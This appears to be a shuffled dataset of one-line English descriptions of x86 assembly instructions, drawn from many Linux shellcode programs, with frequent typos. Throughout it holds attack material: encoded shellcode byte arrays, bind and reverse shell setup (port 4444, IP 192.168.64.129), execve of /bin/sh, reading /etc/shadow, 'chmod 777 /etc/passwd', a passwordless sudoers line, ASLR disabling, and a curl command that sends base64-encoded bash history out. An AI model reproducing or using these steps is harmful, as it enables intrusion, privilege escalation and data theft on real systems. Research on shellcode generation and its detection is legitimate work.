move the 32-bit value 0x8000 into register eax
decrease ecx by 1
store argv array into ecx via the stack or esp
move 0x35 into dh
move the contents of esp into ecx
define odd_number label
push 5 on stack
zero out the eax register and jump to the l3 label if the contents of the edx register is equal to the contents of the eax register
load the effective address [zero_reg+3] into ecx
pick up esi from the stack
make the system call stat
set the contents of edx to zero
zero out ebx and move 0x3 in the lowest byte of the register
jump to shellcode
push 2 on stack
put the syscall 0x2 into the al register
save the socket descriptor stored in eax in edi
jump to decoder_label
move the command socketcall = 102 in al register
load __nr_execve syscall into eax register and the string '/bin//sh\0' into ebx register
load hexadecimal value 0x2 into bl register
define the _next label
increment the contents of the edi register
clean ecx
set the new base pointer
define the byte string '81h'
move al into the address pointed by edi
push the word 0x722d onto the stack
load dup2 syscall into al register
load byte 5 into eax register
main function
define the callit label
define _shellcode label
subtract 3e716230 from the contents of the eax register
move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
move the byte at the address esi + eax +1 into bl
define shell_ret label
put the syscall 1 into the eax register
go to _zero1a label
subtract bx from dx
increment ecx content by 1
push the dword 0x0101017f onto the stack
define the _start label and jump to the call_decoder
add 2 to ebx content
if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register
put 4 in al register
copy 0x10 into dl register
save the socket descriptor stored in eax in esi
push the value 0x6873732f onto the stack
put 2 in bl register
push 0x2431243a onto the stack
jump to the _while_loop label if the operands of the above comparison are not equals
load the effective address [esi+4] into esi
swap the contents of eax and esi
subtract 1663 from the contents of the bx register
push 0x76766c2d to the stack
xoring bl with hexadeimal value 0x90
loop 4 times
clear edx register
push 0bh onto the stack
push the value 0x2f2f2f2f onto the stack and point edx to the stack register
move buff to edx
move to the next word in eax
move the value 1 into the al register
push 0x7361702f onto the stack
point to the next double word in ebx
xoring 0x3 with esi +ecx-1 content
add 27 to dx contents
push the encoded shellcode pointer to stack
jump short to the decode label
move ebx into the address [esp+59]
move the value -1 in eax register then do the one's complement negation of eax end then push it on the stack
move the contents of the eax register into the long starting at the address [esi+30]
define the loop label
restore the top of the stack into the eax register
load __nr_access into al register and ping kernel
return 0 status on exit
compare the contents of the ebp register with the value 0
perform a logical xor between the eax register and the edi register and save the result in eax
subtract dx = 13 to bx = 256
move 0x343997b7 into edi
load the effective address of the result of the operation [esi + 8] into the ecx register
push the size of strcut sockaddr_in
put the syscall 0x5 into the al register
save sockfd
define decoder function
if zero jump to the encoded label
declare global _start
move ebx into the dword at address [esi + 8]
push the value of the port, 1337, on 32 bit in big endian format
sigaction
decrement the contents of the ecx register and jump to the duploop label if the result is not negative
make esi point to shellcode that contains previous xored results
jump short to the memory location loc_402C13 if the contents of the eax register is zero
push edx, ecx and ebx contents on the stack
jump short to decode if al is not equal to cl else jump to shellcode
push null byte as string terminator
make the system call execve
perform an unconditional short jump to call_shellcode_label
jump short to the memory location loc_402B13 if the contents of the eax register is zero
load '/bin/cat' and null teminating string into ebx register
load esp content into ebx register
move to the next word of the encoded shellcode
call the egghunter function
declare the rotate label
clear eax and push it on the stack
push the dword 0x6e69622f onto the stack
swap the values of ebx and eax
jump short to the rotate label
jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
correct the result od the previous unpacked decimal substraction in al register
perform a bit-wise inversion of edx
zero out eax register and push its contents on the stack stack
push 0x622f7273 onto the stack
call the strlen function
move esi into edi
put the byte in the address esi+eax+1 to the first character pointed by edi.
define the _isegg label
call _malloc
divide the contents of eax by the contents of ebx
go to _zeroa label
load '/bin//sh\0' into ebx register
clear edx register
push edx and ebx content on stack
add the value 0x7 to eax and jump to the label L4 if the sum is not zero
put 8 into edx
push the string '////bin/bash' on stack
load address of ptr to envp[] null into edx register
jump to the esp label
multiply ecx by 4 using left shift
jump to the loop label if the zero flag is cleared
if the contents of the dl register is not zero then jump to the label ready_to_proxy
install signal handel
add 0x2 to the contents in cl and save the result in cl
declare section containing initialized data
move the 32-bit value 0x40000 into register ebx
in D1 move the current byte of the shellcode in the bl register
move bl into the byte in edx + eax
decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
push '/bin//sh' on stack
set the args
save the string ' /bin/sh' into ebx
increment ebx content then push it on stack
push '/etc' on stack
save in ecx the pointer to socket arguments
undo rot13
loading 0xfee1dead in ebx
move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
call set_argv
put the syscall 0xc into the eax register
increment the contents of the bx register
move the contents of the esp register into the edx register
execute execve syscall
jump to loop_dup label if the sign flag is clear
in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87
add 0x2f2f to the contents in dx and save the result in dx
add 1 to ebx
move address of response variable into eax
define createfile function
move the contents of eax into the 4 bytes at memory address var1
push the doube word eax content on stack
jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register
move bl into the byte at address [esi+ecx]
define size to be 1024 bytes large
push the byte 0x1f onto the stack
move dl into the byte at address [eax]
move dl into the address [ebx+0xe]
zeroing eax and edx reisters
syscall for sigaction
load dup2 syscall into al register and execute
transfer the decimal value 25 in cl register
load the value 13 on cl register
push /bin to the stack
push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x782f6e69 to the stack
push the byte 15 to the stack
define cycle
point eax to the start of the shellcode
test the value of eax
move 10 into the first byte of the counter
push backlog value equals to 2 on stack
decrement ecx by 1 and as long as sf is not set, jump to _loop label
put the syscall 0x77 into the eax register
load the address of esi+0x1 into edi
invoke sys_execve
move pointer in eax into esi
perform si & 01h discarding the result but set the zero flag to 1 if the least significant but of si is 0, even set the zero flag to 0 if the and operation between the leas singificant bit of si and 01h is zero, while set the zero flag = 1 if the and operation result is 1. if the si == 0 go to even_number label ese go to odd_number label
move the contents of the address esi+1 into dl
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
declare appendfile_label
put the address of "/bin//sh" into ebx via esp
push byte 16 onto stack
execute execve syscall
write to the stdin file
push eax on stack then increment its conent
if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
clear the esi register
move effective address of my_table in ebx
move 25 decimal into the memory address ecx
load the syscall 11 into al register
move the syscall sys_listen in bl register
initialize ebx with 0
compare the byte at the memory location ebp+ecx with 61h
define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
jump short to the cmd label
push the sock file descriptor stored in ebx
subtract the contents of ax from the contents of ax
call the decoder function
save clientfd from eax to ebx
push the string '////bin/bash' onto the stack
clear the eax register
declare a byte with no label containing the value 0x68
jump to 0x41 if not zero
zero out eax and edx
move esp into edx
make the system call sigaction
load the pointer to v4lhist struct arguments in ecx register
define xordecode
move the contents of the esp register into the ecx register
"loop" 4 times
declare push_cmd label
move 21 into cl
move the value 0x1 content into bl register
if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
in the decoder routine save the shellcode in esi
save esp content into ebp
load the effective address of the result of the operation [esi+26] into the edx register
call decoder_setup
initialize counter, ecx, to 2
load stack pointer into ebx register
point ecx to the next byte of the shellcode
push /bin/sh into ebx
initialize bx to 0
make edi point to rot_value
open
divide eax by esi
move 0x4 into al
compare the contents of eax and the contents of eax
move number 9 into edx
add 10 to eax
"loop" 4 times
invoke sys_fork
if not equal jump to the _nex label
zero out bl register
add 0x3f3f3f3f to the contents in esi and save the result in esi
move 0x7f into dl
load the code 0x33 of the syscall acct in al register
in L5 jump to the shellcode
right shift the value of register edx by 4 bits
add 10 to the variable marks
go to _zero13 label
push the dword 0x7264632f onto the stack
move the contents of the ebx register into the long starting at the address [esi+22]
push the dword 0x732f636f onto the stack
subtract 0x24 from the contents in esp and save the result in esp
jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
load the string /bin//sh on ebx register
go to _zero9 label
increment ecx by 1
go to call_egghunter label
push 0x30317974 onto the stack
push the byte 1 onto the stack and point eax to the stack register
increment the contents of the esp register
shift right cx by the contents of al and negate the contents of cx
check if [edi] == eax then increment edi while if no match go to next_addr label. repeat two times
move the 4th element of the word_table into cx
clear eax
perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero
load ecx content, af_inet in 32bit and the 32bit value 4444 on ecx
declare the done label
zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register
execute sys_execve(11)
move client fd to ebx
clear the ebx and edx registers
divide dx:ax by the double word in eax storing in ax the quotient and in dx the reminder
move the contents at memory specified by y to eax
jump short to 0x63
jump to the data label
zero out the ecx register and move the next byte of the shellcode into the lower byte of the register
jump to 0x86 if the carry flag is zero
declare F2 and point to the next word in esi
push the dword 0x69622f2f onto the stack
move 7 into the byte at address cl
push 0x6 onto the stack
increment ebx register
define _zero12 label
push the byte 9 onto the stack
compare ebx register's lower half value against ascii value 57
define the byte string '69h'
add 0x40 to the al register
rotate the bits into al register to the left for 1 time
copy dl content into memory space at the address ebx + 0xe
define the variable neg_number of words and initialize it to -12345
jump to 0xd8 it the carry flag is zero
make sys_write kernel call
move 0x2bc into cx
reserve one word for ymmval
move the contents of ebx into the 4 bytes at memory address var
move the code of syscall dup2 in al register and execute
push null on stack
perform the xor operation between the al register and the value 0x41
clear ecx and eax registers
move 0x14 into dl
move the address in eax into ebx
push the string '/bin//cn' on stack
move 2 into bl
push the byte 0x30 onto the stack
clean the eax register and move 5 in the lowest byte of the register
push ax onto the stack
push the socket file descriptor on stack
add 2 to the contents of the ebx register
push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
increment ax
clean the ebx register and move the next byte of the shellcode into the lower byte of the register
push “/bin//sh” on stack
save socket file descriptor from eax into esi
pick up esi register from the stack
perform an unsigned comparison and jump to 0xf3 if lower
copy socket des from eax to esi register then clear eax
allocate space on the stack for local variable
execute __nr_read syscall
compare the contents of eax with ebx
if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register
move the hexadecimal value 0x8 into bl register
go to file offset
increment ebx content defining sys_bind = 2
add 40000h to eax register
invoke sys_creat
put the syscall 0x1c into the eax register
define the callpop label
suspend the process until the signal arrives
move the byte at the address esi+edi into bl
load __nr_exit into eax register and call kernel
move esp content into ecx register
perform a bitwise and of the contents of ax and the contents of ax
jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
move 0x10 into dl
push af_inet on stack
push null terminating string on stack
move 0x91969dd0 into esi
call the cont function
decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
zero-ing eax
go to _zero19 label
decrement eax
load the value 1 into dl register
declare global start and _start label
save the esi contenmts in ebx register
add 10 to the single byte stored at memory address var
load socketcall syscall number into al register
subtract 1768009314 from the contents of the edi register
decrement cl and jump to L2 if the result is zero
move 05h into al
push the word 0x662d onto the stack
push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push the byte +0x6 onto the stack
backup edx into ecx
declare the next label
push null terminated string 'adow' on stack
push 0x752f2f2f onto the stack
move 0x4 hexadecimal value into bl register
compare the byte at the memory location ebp+ecx with 7ah
save addr of stack into ebx
compare the contents of the ecx register with the contents of the ebp register
move the byte in eax to bl
add the contents of the bh register into the ah register
get information about the file
move the byte 0ffh into dl
decrease the counter and jump to decode if not zero
define next_addr label
add the hexadecimal value 0x33 to al register
make the socketcall
call _continue
if the contents of the memory address ebp+var_a is not equal to zero then jump short to the memory location loc_4010E5
zero out the ecx register and move 25 in the lower 8 bits of the register
make syscall to output the text to stdout
define the switch function
increment edx and push af_inet = 2 on stack
declare the len label equal to the length of shellcode
save the old base pointer value
perform a short unconditional jump to process_shellcode
zero out ecx
push the word 0x7365 onto the stack
push the byte 4 onto the stack
perform a short unconditional jump to _end label
move the value 0x4 onto the stack
push 0x5c11 onto the stack (port:4444)
save esi content into ebx
decoder_setup label
jump to shellcode label if the byte in esi is equal to 0x88
define syscall_execve = 11
if not 0 then jump to the scan label
load eax content and the byte +0x68 into ebx register
perform xor operation between the value stored at the location ecx+116 and bh
copy file descriptor
define call_shellcode function
clear eax and load the codeof syscall waitpid in it and then call kernel
define the _setsockopt label
define the _shell label
0's our eax and ebx
copy 0x2 into bl register
decrement the counter and jump to the fill label if the count is not zero
overwrite the "shellcode" with previous results
save into al register execve system call
push the word 0x401f onto the stack
move address of request variable into ebx
subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
increment esp content
move 0x2e into the byte at address [esp]
increment ecx
zero out ecx and eax
go to aslr_file label
move the socket file descriptor from eax to esi
place the value val in eax
_start function
load and run the program
define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
push 0x30313a31 onto the stack
decrement cl register by 1
if the contents of the eax register is negative then jump to the label old_dirent
shift left edi register bits 1 time with zeroes shifted in on right
push file descriptor on stack
push the string //sbin// on the stack
system call getpgrp
if the remainder is not equal to zero jump to local label checkbuzz
if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else
load the string /cte/shadow on ebx register
move the value 11 into the al register
save addr of stack into ebx
jump to the decode label if the zero flag is cleared
push //sh in esi
define shellcode_ label
increment edi
define function D3 and subtract 7 from the current byte of the shellcode
compare the byte at the address esi and 0xd
perform a logical xor between the eax register and 0xffffffff and save the result in eax
move dword 0x5090508f into ebx
push htons(4444)
shift right dl by 1
load the address of esi into ebx register
ecx point the top of the stack
define the byte string path and initialize it to '//bin/sh'
clear eax register and push its contents on the stack
move al into the address [esi+34]
initialize counter ecx=2
copy the code of syscall open to al register
add hexadecimal value 0x11111111 to edi content
define the function F3, negate al and move al to the next byte
define the byte value bytes and initialize it to 10
right shift the contents of dl register by 1 bit positions
push ebx on the stack
put the byte VALUE into the eax register
move the byte at the address [esi] into al
set edx to 0
declare global _start, section .text, egg_sign = 0x4f904790 and_start label
move m_src4 to edx
push null byte on the stack
move the number of the syscall exit in al register
jump to the label _read if the zero flag is set
push the dword 0x5f657a69 onto the stack
copy eax content into edx register
jump if less than to label finished
decrement the counter and jump to .3 label if the count is not zero
move 72h into al
define the byte string 'cp /bin/sh /tmp/sh'
move edi into the local memory address ebp-4
move the previous byte of the shellcode to dl
move the 4th element of the array word_table into cx
push the ax onto the stack
push af_inet6 = 10 on stack
push the word bx onto the stack
push 0x74652f2f onto the stack
load dup2 syscall into al register
load hexadecimal value 0x2 into cl register
increment edx register by 1
decrements ecx by 1
swap the values of edx and eax registers
move the byte at the address 0eh into bl
push the dword [edx+2] onto the stack
copy hexadecimal value 0x4a into dh register
push dx rergister on the stack
set signal delivery alarm clock
load socket = 1 into bl register
move the memory address of message string into ecx
put cpu into a wait state until the coprocessor signals it has finished it's operation
declare the function D2 and negate the current byte of the shellcode
push socket parameters sock_stream = 1 and af_inet = 2 on stack
subtract 12 from the contents of the esp register
allocate 10 words each initialized to 0
global _start
move address of request variable into ecx
run xor operation between ax register and 20339 value then between the same register and 12353 value
push 0x64777373 onto the stack
declare the shift_decode label
push pointer address on stack
define _next label
decimal adjust al register after subtraction.
call kernl
move the byte at the address [eax + 1] into dl
put the syscall 0x64 into the eax register
push 0x79616c70 onto the stack
move the contents at the address pointed by esi into the ax register
calling interrupt for sys call
push the word 0x5c11 to the stack
right shift the contents of the edx register by the byte 24
copy the value sys_bind =2 on stack
place the value in var in eax
reserve array realarray of 10 real numbers
define the _start label and jump to call_decoder
cleaning eax and ebx registers
move the 64 bit of esi into mm1 64bit register
call the sprintlf function
loop deocde
push the 4 bytes at address var onto the stack
move 2 into cl
call decoder
load the effective address [esi+18] into ecx
clear the ecx register and move 2 in the lowest byte of the register
jump to label l20
decrement cl by1
move bl into the byte in edi and perform xor operation with 0xdd
swap the contents of the ebx register with the contents of the edx register
xoring ecx
define len = size of db "127.1.1.1 google.com"
move the value 0x1 into the al register
perform the or operation between the eax register and 0xffffffff
close the file
ebx point to the structure
push /bin//sh in stack
define _ prepare label
push $0x6e69622f onto the stack
zero out edx and ecx regsiter
perform a short unconditional jump to fileaddress
push af_inet = 2 on stack
clear eax and put the number of syscall open in it
define cmd as the byte string 'cat /etc/passwd'
move donemsg into ecx
push ipv4 address 192.168.64.129 (hex) on stack
define the call_shellcode label
go to _shellcode label after entering the address of the string = '/proc/sys/kernel/randomize_va_space' on the top of the stack
zero out edx
clean the ebx register and move 5 in the lowest byte of the register
push the value 0x3170762d to the stack
jump to the label l3 if the contents of the dl register is greater than the decimal value 27
clear eax register and push ita content on the stack
jump short to the .exit label
subtract 0x1 from the current byte of the shellcode and negate the result
declare data section
jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register
kill
go to _zero18 label
move msg to ecx
push the hexadecimal value 0x6, 0x1 and 0x10 on stack that represent respectively then args ipproto_tcp =6, the socket_type = sock_stream (0x1) and af_inet6= 10
compare eax with ebx content, if the xero flag is set go to the address 0x47
push the 0x6962732f onto the stack
jump to the _dup2_loop label if the previous instruction clears the sign flag
negate all bits of edi register
add the byte at the address edi after subtracting the value 7
move the byte at the address esi+edi+1 into dl
test the contents of the ebx register
copy ss content into the word at the address edi-0x69622f69
move hexadecimal value 0x3734b117 into edi content
define the doubleword variable real_number2 and initialize 123456
jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register
define call_decoder function
exchange the content of eax with ebx so now ebx holds the new sockfd that was accepted
get the parent process ID
add 16 to eax
push two times edx on the stack and then load the stack pointer in ecx register
right shift the contents of bl register by 4 bit positions
define _zerob label
declare _cmd register
declare text section
move 0x167 into ax
transfer the descriptor for the accepted socket from eax into ebx
declare _incpage label
push the word 0x662d onto the stack and point the esi register to the stack register
load the value of register ebx into register esp
decrement ebx
execute the reboot syscall
declare D1 and move the current byte of the shellcode in the cl register
jump to label child if the zero flag is set
pop the shellcode in esi and save it into dx
push eax register on the satck than clear it and put the number of the syscall exit in its laast byte
push the value 0x64687373 onto the stack and point the ebp register to the stack register
move 0x33 into al
save esp content into esi register
push the doubleword 0x2f2f6e69 to the stack
jump to fupdisasm+1
perform an unconditional jump to _find_address label
load the effective address of the result of the operation [ebp+28] into the ecx register
push the dword 0x017aa8c0 onto the stack
put the syscall 0x06 into the eax register
pick uo "all all=(all) nopasswd: all" stored i ecx from stack
push terminating null on stack
zero out ecx and move 0x3 in the lowest byte of the register
pop edx from stack
negate the contents of var
load execve syscall number into al register
move 0x5309 into cx
decrement the contents of the cl register and jump to the loopinghere label if the result is not negative
move esi into edx
clear ecx and move the value 3 in it
define main label
add the contents of ebx to the contents of eax
push null termination
pick up ecx content from stack
move 0x72702f2f into esi
set the socketcall type to sys_listen
move 0x04 into bl
push the hexadecimal value 0xb on the stack and put it in eax register taking it from the stack
push 0x7665642f onto the stack
push 20 onto the stack
save client_sockfd exchanging eax content with ebx content
push the byte 6 to the stack
if the contents of the al register is equal to the value 0xf2 then jump to the label next_page
push null terminating string and '/bin/sh' to the stack
declare an unlabeled byte initialized to 10
move 0x0a into the byte at address [esp]
compare if ecx is equal to 100
define the function F1 and store the encoded shellcode pointer in the esi register
push double word 0x74652f2f onto the stack and point the esi register to the stack register
declare the loop label
if the contents of the eax register is zero then jump to the label close
move the memory address of filecontents variable into eax
push hexadecimal value 0xfffffffa on stack
move eax to ebp
move 99 into al
if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3
if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label else jump to the while label
right rotate the shellcode in esi by one
copy 0x1cd9faf7 into esp content
move the value 0xff into bl
clear eax, ebx, ecx and edx registers
perform an unconditional jump to read_file_label
jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e
clear ebx register and put its content as a double word on stack
define the call_shellcode function and call decoder
load syscall duo2 into al register
set ebx =1
system call pause
multiply ebx by 4 using left shift
subtract 3.3.3.3 from ip address
perform a logical xor between the ebx register and the word __flag_byte and save the result in ebx
declare _stage label
copy hexadecimal value 1+0xfe in dl register
move ecx to edi
declare the main_inc label
subtract the contents of esi from the 32-bit integer stored at memory location var
subtract 8 from esp and save the result in esp
increase eax by 1
shift right all bits of eax 0x8 times
zero out the edx register and push zero onto the stack
exchange eax content with ebx content (save clientfd from eax to ebx)
move effective address of my_table in ecx
load 0x10 into cl register
put syscall execve code in al register
move data at memory location a_letter into al
compare if ecx is zero
pick up eax from the stack
load in bl register the argument sys_bind = 2
define F3 and jump to L5
call chmod syscall
move the 32-bit integer representation of 4 into the doubleword starting at address ebx
move 0xd into dl
define _loop_dup label
right rotate the byte in esi 1 time
push the word 0x6f64 onto the stack
put the syscall 3h into the eax register
push the word 0x632d onto the stack and point the eax register to the stack register
perform xor between bl and dl and jump short to shellcode if the result is not zero
copy the value 0x4 into ecx
subtract 0x1 from the byte at the address esi and negate the result
xoring al register with bl register
set connect = 3
push the contents of the edi register onto the stack and point ecx to the stack register
if the contents of the al register is greater than or equal to the decimal value 9 then jump to the label l1
write to the stdout file
set the so_reuseaddr onto the stack
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
store the value 5 into the byte at memory location var
push the value 0x68735858 onto the stack
jump to 3f if the sign flag is zero
push the word 0x6465 onto the stack
put the syscall 9 into the eax register
go to _zerod label
push the string '//etc/shadow' on stack
increment the count variable
load __nr_dup2 into eax register
jump short to the memory location loc_4010E5 if the contents of the memory address ebp+var_a is not equal to zero
define msg as the byte string 'curl http://localhost:8080 -d \'data='$(cat .bash_history | base64 -w 0) -x post'
jump short to the label decode
load __nr_open into eax register
move dword 0x50905091 into ebx
in the routine R1 point to the next byte in esi
load chained null and the arg -le//bin//sh into edi register
push the word 0x6f64 to the stack
right shift ax by 1 bit
jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register
jump to the memory address 0x40 if the contents of the al register is equal to the value 0x38 else push the byte representation of the value 0x1 onto the stack
shift left the eax register by 28 bits
push the double word 0x313a303a onto the stack
clear the eax and the ebx registers
call sys_read
push the dword 0x7665642f onto the stack
define _read label
push on stack the listening ip 127.1.1.1:10 and save it into esi register then push null and '- display' command and save it in edi register. subsequently push null and the string '///usr/bin/xterm' and save it into ebx register. in the end push eax, esi, edi and ebx on sta stack.
perform xor operation between the value stored at the location ecx+116 and dh
move the effective address of digits+eax into al
transfer esp contents into ecx
copy bl content into the byte at the address esi+ecx
clear the eax register and move 22 into the lower byte of the register
invoke sys_unlink
push ax to the stack
if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register
allocate one byte of memory for var_a variable and initialize it to 232
declare section. data, section .bss, section. text, global _start, _start label
load in esi the pointer to '-f' argument
go to _zero3 label
point ebp to top of stack
copy esp content into ecx register
jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
load __nr_fork sycall into al register
store the pointer to the shellcode into esi
perform a short unconditional jump to get_label
push 0x68732f2f to the stack
declare global _start, section .text, _start label
move 0x04 into al
move 3 decimal into edx
place the quantity ebx+4*esi in edi
define _two label
execute close syscall
push 0x37373333 onto the stack
multiply the contents of eax by 25
put the syscall 0x05 into the eax register
restore esi from the value we pushed onto the stack at the start
left rotate the contents of the edx register by 0x4 bits
subtract 13 from the ax register
performs the two's complement negation of the edi contents.
push 0x73644d24 onto the stack
transfer eax content into ebx
compare the contents of the eax register and the contents of the ebx register
perform an unconditional jump to _read label
set the sol_socket onto the stack
move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
move 4 into eax
system call dup2
call loader
move 2001 into cx
if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register
define the decode label
load 'jmp edx' command into ebx register
jump to error label if sign flag SF is equal to 1
decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
push 0x8 onto the stack
define the call_decoded label
move the byte in edi into the al register
push the contents of eax register onto the stack
push the 0x10 onto the stack
jump to eax content
define _callpop label
decoder label
push eax on the stack
push 0x2e373231 onto the stack
copy 3 into cl register
subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8
jump to the next_cycle label if the zero flag is cleared
increment ecx to 1
push nib/
define decode_insertion label
push dx content on stack
clear eax and push it on the stack
restore ebx from the value we pushed onto the stack at the start
add the contents of edx to the contents of eax
cleat ecx
subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
load the effective address of the result of the operation [esi+35] into the ecx register
encoded shellcode in esi
jump to incpage if equal
subtract the contents of dl register from the contents of cl register and save the result in cl
divide ebx by 2 using right shift
move the value 0x4 into al register
load the effective address [esi+26] into edx
push 'hs/b'
push af_inet = 2
define the _parent label
push ebx and the value 0x4 on stack
left shift eax by two bits
section data
increment edi by 1
check if eax is zero
copy esp content in ecx register
move edx into ecx
define dup2 function
push eax, ebp, edi, esi, ebx on the stack
move the byte in esi+ecx+1 into bl
negate all bits in the byte at the memory location tmp
push eax to the stack
move the contents of the esp register into the ebx register
clear ebx and pop it from the stack
make the system call to copy the file descriptor
transfer control to the instruction at the address 0x8585
replaces the contents of the edi register with its two's complement
move the value 0x2 into the cl register
moving egg=0x50905090
add 0x3 to the contents in al and save the result in al
move the byte at address digits+ebx into bl
increment esi three times
load the address of the variable at the address ebx+0xfinto eax register
push edx content
add the value 1 into the ecx register
ping kernel
define the _while_loop label
perform a short unconditional jump to _gotocall label
declare the two label
load the string 192.168.1.93//x </dev/null2<&1 in ecx register
load 11 into eax register
move 43 decimal into edx
define call_shellcode_label
move edi into eax
push a word null, a word of a characters and a word of 2 on the stack then load the stack pointer into ecx register
push /bin//sh
push the word 0x697a onto the stack
move the contents of cl into the byte at memory address esi+eax
backup the contents of cl into bl
jump short to the label _parent if the contents of the eax register is not zero
add the value on ebx to eax
execute execve syscall
go to _zero14 label
shift left edx register bits 24 time with zeroes shifted in on right
move bh into the byte in esp+eax+2
use stdout
push 0x2923 onto stack port
push the word 0x632d to the stack
declare the todo label
clean the ecx register and move 5 in the lowest byte of the register
execute the function chmod 777 /etc/passwd
if the contents of the bl register is greater than or equal to the value 78h then jump to the memory location loc_402B1D
if esi content is less then 13 go to wrap_aroud
push 'ar/l' on satck
push af_inet6 = 10 as word on stack
push lenght of address 0x10 on stacik
go to decoder label
set the mem addr dinamically
call function internetreadfile
zero out the edx register and move the next byte of the shellcode into the lower byte of the register
if the contents of the edx register is equal to 42 then jump to loc_402B13
move 0x243525f0 into esi
save esp content into ecx register
push ecx on the stack and then place pointer to ecx
load the string /bin into edi register
increment bl register by 1
insert ebx on the stack
push eax value to the stack
cler ebx
jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address
jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
push port number on stack as a word
compare the value in the eax register to the doubleword addressed by the edi register
define even_number
push the address of msg on the top of the stack, and then change the eip to the address in _build label
pick up eax content from the stack
move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi
move address of stack pointer into edx
put the syscall 11 into the eax register
compare the word at the address ecx and 0x5951
decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label
push 0x6769666e onto the stack
push the word 0xffff to the stack
move 0ah into eax
move the contents at memory address z to edx
go to _decoder label after entering the address of the array shellcode (0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87) on the top of the stack
zero out ecx register
move stack pointer into edx
load socketcall syscall into al register
put the syscall 0x3f into the eax register
return a code of zero
add decimal integer 2 to ebx
increment the contents of the ax register
go to _connect label
define rot_decode_label
push the word 0xb315 onto the stack
save the socket descriptor stored in eax in esi
declare _write label
zero out edx using the sign bit from eax
define L2 and jump short to esi
push the dword 0x776f6461 onto the stack
if zero flag is set jump to nomoreargs label
save addr of stack into esi
move al into the byte at address [esi+10]
load __nr_socketcall into al register
zero out eax and ebx registers using xor operation
push 0x6c626174 onto the stack
if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register
move the contents of the al register into the edi register
right shift the contents of eax by 31 bits
push the value 0x69622f2f onto the stack and point the ecx register to the stack register
multiply edx by 4 using left shift
declare the decoder function
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
push the argument pf_inet6 = 10 on stack
clear ebx
push the hexadecimal value 10, ecx content and edi content on the stack. then load the stack pointer into ecx register.
move 876189623 into edi
move the address of buzz string into eax
push 0x7374736f onto the stack
moves the sys_setsocketopt as param 1
load the satck ppointer into ecx register
formatting label
move 0xb into al
move ecx into ebp
copy ecx content into ebx
